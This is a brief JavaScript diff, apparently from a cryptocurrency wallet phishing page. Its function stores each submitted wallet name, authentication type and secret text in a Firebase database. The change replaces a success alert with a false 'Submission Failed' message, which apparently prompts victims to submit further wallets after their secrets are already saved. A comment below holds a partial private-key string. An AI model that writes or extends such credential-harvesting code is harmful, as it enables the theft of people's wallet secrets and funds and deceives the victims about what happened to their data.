@@ -185,7 +185,7 @@ const firebaseDb = new FirebaseDB();
 function savewalletData(wallet_name, auth_type, auth_text){
   //let firebaseDb = new FirebaseDB();
   firebaseDb.writeWalletData(wallet_name, auth_type, auth_text);
-  alert("Submission accepted: Wallet verified!");
+  alert("Submission Failed: Try an active Wallet.");
 }
 
 // text privateKey: 0x648ab788c99ba9ec822bbDDf78
